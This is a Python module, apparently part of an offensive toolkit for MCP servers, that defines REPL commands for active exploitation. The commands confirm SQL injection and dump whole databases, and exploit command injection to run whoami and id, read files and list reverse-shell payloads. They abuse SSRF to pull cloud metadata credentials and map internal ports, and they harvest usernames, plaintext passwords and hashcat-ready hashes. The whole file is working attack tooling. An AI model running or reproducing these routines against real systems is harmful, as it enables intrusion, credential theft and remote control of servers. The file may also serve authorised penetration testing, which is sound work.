"""Active exploitation REPL command handlers: sqli, cmdinj, ssrf, credharvest."""
from __future__ import annotations

from typing import TYPE_CHECKING

from rich.console import Console
from rich.panel import Panel

if TYPE_CHECKING:
    from ..state import REPLState


# ─── sqli ─────────────────────────────────────────────────────────────────────

async def cmd_sqli(state: "REPLState", args: list[str], console: Console) -> None:
    """SQLi enumerator for resource templates.

    Usage:
      sqli                                         auto-detect injectable templates
      sqli --template price://{item} --param item  target specific template
      sqli --template price://{item} --param item --dump-tables
      sqli --template price://{item} --param item --dump-all
      sqli --template price://{item} --param item --sqlmap-export
    """
    from ...scanners.sqli import SqliEnumerator, generate_sqlmap_proxy
    from rich.table import Table
    from rich import box as _box

    # Parse args
    template: str | None = None
    param: str | None = None
    dump_tables = "--dump-tables" in args or "--dump-all" in args
    dump_all = "--dump-all" in args
    sqlmap_export = "--sqlmap-export" in args
    proxy_port = 18080

    for i, a in enumerate(args):
        if a == "--template" and i + 1 < len(args):
            template = args[i + 1]
        elif a == "--param" and i + 1 < len(args):
            param = args[i + 1]
        elif a == "--proxy-port" and i + 1 < len(args):
            try:
                proxy_port = int(args[i + 1])
            except ValueError:
                pass

    from ...client import MCPClient
    async with MCPClient(state.target, headers=state.mcp_client.headers,
                         timeout=state.mcp_client.timeout) as client:
        enum = SqliEnumerator(client)

        if not template or not param:
            console.print("[dim]Auto-detecting injectable resource templates...[/]")
            inventory = await client.get_inventory()
            pairs = await enum.detect_injectable_templates(inventory.resource_templates)
            if not pairs:
                console.print("[yellow]No injectable resource templates found in inventory.[/]")
                return
            template, param = pairs[0]
            console.print(f"[green]✓[/] Injectable: [bold]{template}[/] (param: [bold]{param}[/])")

        with console.status(f"[cyan]Enumerating {template} via {param}...[/]"):
            result = await enum.run(template=template, param=param,
                                    dump_tables=dump_tables, dump_all=dump_all)

    if not result.confirmed:
        console.print(f"[yellow]Not injectable:[/] {template} (param: {param})")
        return

    console.print(Panel(
        f"[bold green]CONFIRMED[/]  {result.technique}\n"
        f"[bold]Template:[/] {result.template}  param: [bold]{result.param}[/]\n"
        f"[bold]Columns:[/]  {result.column_count}  (string col: {result.string_col})\n"
        f"[bold]Database:[/] {result.db_name or '[dim]unknown[/]'}",
        title="[bold red]SQLi Confirmed[/]",
        border_style="red",
    ))

    if result.error:
        console.print(f"[yellow]Note:[/] {result.error}")

    if result.tables:
        tbl = Table(title="Tables", box=_box.SIMPLE)
        tbl.add_column("#", style="dim", width=4)
        tbl.add_column("Table", style="bold")
        for i, t in enumerate(result.tables, 1):
            tbl.add_row(str(i), t)
        console.print(tbl)

    for table, rows in result.data.items():
        if not rows:
            continue
        cols = result.columns.get(table, list(rows[0].keys()) if rows else [])
        dtbl = Table(title=f"[bold]{table}[/]", box=_box.ROUNDED, show_lines=True)
        for col in cols:
            dtbl.add_column(col)
        for row in rows:
            dtbl.add_row(*[str(row.get(c, "")) for c in cols])
        console.print(dtbl)

    if sqlmap_export:
        script, cmd = generate_sqlmap_proxy(template, param, state.target, proxy_port)
        proxy_file = "sqli_proxy.py"
        from pathlib import Path
        Path(proxy_file).write_text(script)
        console.print(Panel(
            f"[bold]Proxy:[/] python {proxy_file}\n"
            f"[bold]sqlmap:[/] [green]{cmd}[/]",
            title="sqlmap Export",
            border_style="cyan",
        ))
        console.print(f"[green]✓[/] {proxy_file} written.")


# ─── cmdinj ───────────────────────────────────────────────────────────────────

async def cmd_cmdinj(state: "REPLState", args: list[str], console: Console) -> None:
    """CMDi exploiter.

    Usage:
      cmdinj --tool <name> --param <name>
      cmdinj --tool <name> --param <name> --lhost 10.0.0.1 --lport 4444
      cmdinj --tool <name> --param <name> --no-enum
    """
    from ...scanners.cmdinj import CmdInjExploiter
    from ...client import MCPClient

    tool_name: str | None = None
    param: str | None = None
    base_value = "test"
    enumerate_system = True
    lhost = ""
    lport = 4444

    for i, a in enumerate(args):
        if a == "--tool" and i + 1 < len(args):
            tool_name = args[i + 1]
        elif a == "--param" and i + 1 < len(args):
            param = args[i + 1]
        elif a == "--base-value" and i + 1 < len(args):
            base_value = args[i + 1]
        elif a == "--lhost" and i + 1 < len(args):
            lhost = args[i + 1]
        elif a == "--lport" and i + 1 < len(args):
            try:
                lport = int(args[i + 1])
            except ValueError:
                pass
        elif a == "--no-enum":
            enumerate_system = False

    if not tool_name or not param:
        console.print("[yellow]Usage: cmdinj --tool <name> --param <name>[/]")
        return

    async with MCPClient(state.target, headers=state.mcp_client.headers,
                         timeout=state.mcp_client.timeout) as client:
        exploiter = CmdInjExploiter(client)
        with console.status(f"[cyan]Probing CMDi in {tool_name}.{param}...[/]"):
            result = await exploiter.run(
                tool_name=tool_name, param=param, base_value=base_value,
                enumerate_system=enumerate_system, lhost=lhost, lport=lport,
            )

    if not result.confirmed:
        console.print(f"[yellow]Not injectable:[/] {tool_name}.{param}")
        return

    console.print(Panel(
        f"[bold green]CONFIRMED[/]  {result.technique}  OS: {result.os_type or '?'}\n"
        f"whoami: [bold]{result.whoami or 'N/A'}[/]  id: {result.id_output or 'N/A'}\n"
        f"hostname: {result.hostname or 'N/A'}",
        title="[bold red]CMDi Confirmed[/]", border_style="red",
    ))

    if result.interesting_files:
        for path, content in result.interesting_files.items():
            console.print(Panel(content[:400], title=f"[bold]{path}[/]",
                                border_style="yellow", padding=(0, 1)))

    if result.reverse_shells:
        console.print("[bold]Reverse shell payloads:[/]")
        for i, shell in enumerate(result.reverse_shells, 1):
            console.print(f"  [dim]{i}.[/] {shell}")

    if result.error:
        console.print(f"[yellow]Note:[/] {result.error}")


# ─── ssrf ─────────────────────────────────────────────────────────────────────

async def cmd_ssrf(state: "REPLState", args: list[str], console: Console) -> None:
    """SSRF exploiter.

    Usage:
      ssrf --tool <name> --param <name>
      ssrf --tool <name> --param <name> --no-cloud
    """
    from ...scanners.ssrf_exploit import SsrfExploiter
    from ...client import MCPClient

    tool_name: str | None = None
    param: str | None = None
    probe_cloud = True
    probe_internal = True

    for i, a in enumerate(args):
        if a == "--tool" and i + 1 < len(args):
            tool_name = args[i + 1]
        elif a == "--param" and i + 1 < len(args):
            param = args[i + 1]
        elif a == "--no-cloud":
            probe_cloud = False
        elif a == "--no-internal":
            probe_internal = False

    if not tool_name or not param:
        console.print("[yellow]Usage: ssrf --tool <name> --param <name>[/]")
        return

    async with MCPClient(state.target, headers=state.mcp_client.headers,
                         timeout=state.mcp_client.timeout) as client:
        exploiter = SsrfExploiter(client)
        with console.status("[cyan]Probing SSRF...[/]"):
            result = await exploiter.run(
                tool_name=tool_name, param=param,
                probe_cloud=probe_cloud, probe_internal=probe_internal,
            )

    if result.cloud_provider:
        console.print(f"[bold green]Cloud: {result.cloud_provider}[/]")
        for key, content in result.cloud_metadata.items():
            console.print(Panel(content[:300], title=key, border_style="yellow", padding=(0, 1)))

    if result.cloud_credentials:
        console.print("[bold red]Credentials:[/]")
        for k, v in result.cloud_credentials.items():
            console.print(f"  {k}: {v[:80]}")

    if result.internal_ports:
        console.print("[bold]Reachable internal endpoints:[/]")
        for ep in result.internal_ports:
            console.print(f"  [green]✓[/] {ep}")

    if result.kubernetes_exposed:
        console.print("[bold red]Kubernetes API reachable![/]")

    if not result.cloud_provider and not result.internal_ports:
        console.print("[yellow]No SSRF data retrieved.[/]")
        if result.error:
            console.print(f"[dim]{result.error}[/]")


# ─── cred-harvest ─────────────────────────────────────────────────────────────

async def cmd_credharvest(state: "REPLState", args: list[str], console: Console) -> None:
    """Post-SQLi credential harvester. Requires a prior 'sqli --dump-all' result in state.

    Usage:
      credharvest --template <tpl> --param <p>       runs sqli first, then harvests
      credharvest --template <tpl> --param <p> --extra-tables shadow,backups
    """
    from ...scanners.sqli import SqliEnumerator
    from ...scanners.cred_dump import CredDumper
    from ...client import MCPClient

    template: str | None = None
    param: str | None = None
    extra_tables: list[str] = []

    for i, a in enumerate(args):
        if a == "--template" and i + 1 < len(args):
            template = args[i + 1]
        elif a == "--param" and i + 1 < len(args):
            param = args[i + 1]
        elif a == "--extra-tables" and i + 1 < len(args):
            extra_tables = [t.strip() for t in args[i + 1].split(",")]

    if not template or not param:
        console.print("[yellow]Usage: credharvest --template <tpl> --param <p>[/]")
        return

    async with MCPClient(state.target, headers=state.mcp_client.headers,
                         timeout=state.mcp_client.timeout) as client:
        enum = SqliEnumerator(client)
        with console.status("[cyan]Confirming SQLi...[/]"):
            sqli_result = await enum.run(template=template, param=param,
                                         dump_tables=True, dump_all=False)

        if not sqli_result.confirmed:
            console.print(f"[yellow]SQLi not confirmed for {template}[/]")
            return

        console.print(f"[green]✓[/] SQLi confirmed. Harvesting credentials...")

        dumper = CredDumper(client, sqli_result)
        with console.status("[cyan]Harvesting credentials...[/]"):
            result = await dumper.run(extra_tables=extra_tables or None)

    if not result.confirmed or not result.credentials:
        console.print("[yellow]No credentials found.[/]")
        return

    console.print(Panel(
        f"[bold red]{len(result.credentials)} credential(s) found[/]\n"
        f"Tables: {', '.join(result.credential_tables)}",
        title="[bold red]Credentials Harvested[/]", border_style="red",
    ))

    from rich.table import Table as _Table
    from rich import box as _box
    tbl = _Table(box=_box.ROUNDED, show_lines=True, padding=(0, 1))
    tbl.add_column("Table")
    tbl.add_column("Username")
    tbl.add_column("Password/Hash")
    tbl.add_column("Hash Type")
    tbl.add_column("Email")

    for cred in result.credentials[:50]:
        tbl.add_row(
            cred.table, cred.username or "—",
            (cred.password_raw[:30] + "…") if len(cred.password_raw) > 30 else cred.password_raw,
            cred.hash_type or "—", cred.email or "—",
        )
    console.print(tbl)

    if result.plaintext_lines:
        console.print(f"\n[bold]Plaintext ({len(result.plaintext_lines)}):[/]")
        for line in result.plaintext_lines[:10]:
            console.print(f"  [red]{line}[/]")

    if result.hashcat_lines:
        console.print(f"\n[bold]Hashcat format ({len(result.hashcat_lines)}):[/]")
        for line in result.hashcat_lines[:5]:
            console.print(f"  [dim]{line}[/]")


# ─── Command registry ─────────────────────────────────────────────────────────

COMMANDS: dict[str, tuple] = {
    "sqli":        (cmd_sqli,        "SQLi enumerator for resource templates"),
    "cmdinj":      (cmd_cmdinj,      "Command injection exploiter"),
    "ssrf":        (cmd_ssrf,        "SSRF exploiter (cloud metadata + internal ports)"),
    "credharvest": (cmd_credharvest, "Post-SQLi credential harvester"),
}
